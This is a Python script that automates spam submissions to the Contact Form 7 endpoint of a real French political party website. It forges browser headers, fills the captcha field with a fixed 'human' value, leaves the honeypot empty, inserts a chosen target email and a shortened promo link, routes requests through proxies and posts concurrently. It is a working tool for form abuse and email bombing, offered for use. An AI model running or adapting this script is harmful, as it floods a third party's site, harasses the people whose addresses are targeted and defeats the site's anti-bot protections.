import string
import requests

from module import Spam

cookies = {
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-analytics': 'no',
    'cookielawinfo-checkbox-twitter': 'no',
}
headers = {
    'authority': 'www.upr.fr',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary2MgKHJ2CQhj05ly3',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-twitter=no',
    'origin': 'https://www.upr.fr',
    'referer': 'https://www.upr.fr/nous-contacter/',
    'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
}
DATA = '------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n7667\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.6\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nen_US\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f7667-p24-o1\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n24\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="your-name"\r\n\r\n$text\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="your-email"\r\n\r\n$target\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="your-member-number"\r\n\r\n$text\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="postcode"\r\n\r\n$text\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="sujet"\r\n\r\nJ\'ai de nouvelles idées de militantisme ou de communication à suggérer\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="your-message"\r\n\r\n$text\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="kc_captcha"\r\n\r\nkc_human\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="kc_honeypot"\r\n\r\n\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="fichier"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3\r\nContent-Disposition: form-data; name="fichier2"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundary2MgKHJ2CQhj05ly3--\r\n'

url = 'https://www.upr.fr/wp-json/contact-form-7/v1/contact-forms/7667/feedback'


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        data = string.Template(DATA).substitute({'target': target, 'text': text}).encode().decode('latin-1')
        response = requests.post(url, cookies=cookies, headers=headers, data=data, proxies=proxies)
        return response


if __name__ == '__main__':
    success_message = 'Merci'
    project_name = 'upr'
    promo_link = 'bit.ly/3z0PP5B'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
